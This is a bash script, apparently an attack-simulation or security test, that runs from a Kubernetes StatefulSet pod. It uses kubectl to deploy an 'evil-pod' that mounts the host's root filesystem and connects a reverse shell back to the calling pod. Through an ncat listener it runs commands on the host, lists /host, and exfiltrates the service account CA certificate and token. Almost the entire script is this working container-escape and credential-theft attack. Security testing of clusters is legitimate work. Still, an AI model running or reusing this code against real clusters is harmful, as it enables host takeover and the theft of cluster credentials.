#!/bin/bash
k=kubectl
IN_SS=0  # whether the hostname format matches the "StatefulSets" convention.
ORD=0    # which pod we are currently on (by ordinal)
ENV=/etc/kenv # k8s environment variables

[[ $(hostname) =~ -([0-9]+)$ ]] && IN_SS=1

if [[ $IN_SS == 1 ]]; then
  echo "Detected stateful set pod running in k8s"
  ORD=${BASH_REMATCH[1]}
  echo "Using ORD=$ORD as the config identifier"
else
  echo "Error: not running in k8s stateful pod. exiting."
  exit 1
fi

if [[ -f $ENV ]]; then
  echo "initializing k8s env"
  # shellcheck disable=SC1090
  . "$ENV"
fi

function error {
  echo "$@"
  exit 127
}

function set_default_context {
  $k config set-context default
}

# get pod's ip address.
function get_pod_ip_address {
  set_default_context

  IP=$($k describe pod "$(hostname)" | grep -E '^IP:' | awk '{print $2}')
  if [[ -z $IP ]]; then
    error "get_pod_ip_address: ERROR: cannot find this pod's IP address"
  else
    echo "get_pod_ip_address: IP of this pod is $IP"
  fi
}

function get_reverse_shell_output {
  cmd="$*"
  tmp_out="/tmp/get_reverse_shell_output.$$"
  echo "Getting output from reverse shell ($cmd) ..."
  timeout -k 2 10 cat <(echo "$cmd") <(sleep 1) | ncat -l "$ATTACKER_PORT" >$tmp_out
  echo "Command finished."
  OUTPUT=$(cat $tmp_out)
  rm $tmp_out
}

function exfiltrate_secrets {
  crt="/var/run/secrets/kubernetes.io/serviceaccount/ca.crt"
  tok="/var/run/secrets/kubernetes.io/serviceaccount/token"
  echo "Attempting to exfiltrate secrets ..."
  get_reverse_shell_output cat "$crt"
  echo "$OUTPUT"
  get_reverse_shell_output cat "$tok"
  echo "$OUTPUT"
}

ATTACKER_PORT=8765

# create evil pod.
function create_evil_pod {
  get_pod_ip_address

  $k apply -f - <<EOF
  apiVersion: v1
  kind: Pod
  metadata:
    name: evil-pod-$ORD
  spec:
    restartPolicy: Never
    containers:
    - name: evil-pod-$ORD
      image: alpine:latest
      command: ['sh', '-c', 'apk add bash && bash /etc/evil-pod-entrypoint/evil-pod-entrypoint.sh $IP $ATTACKER_PORT']
      volumeMounts:
        - name: evil-pod-entrypoint-volume
          mountPath: /etc/evil-pod-entrypoint
        - name: host-root-volume
          mountPath: /host
    volumes:
      - name: evil-pod-entrypoint-volume
        configMap:
          name: evil-pod-entrypoint
      - hostPath:
          path: /
          type: ""
        name: host-root-volume
EOF
  # shellcheck disable=SC2181
  if [[ "$?" != 0 ]]; then
    error "create_evil_pod: ERROR: cannot create pod!"
  fi
}

echo "Creating evil pod and running reverse shell tests ..."
create_evil_pod
sleep 10
get_reverse_shell_output uname -a
echo "output: $OUTPUT"
get_reverse_shell_output ls -al /etc
echo "output: $OUTPUT"
get_reverse_shell_output ls -al /host
echo "output: $OUTPUT"
exfiltrate_secrets

if [[ $SKIP_DELETE == 1 ]]; then
  echo "Tests done, skipping pod removal! leaving it up for testing ..."
else
  echo "Tests done, removing pod"
  $k delete pod evil-pod-"$ORD"
fi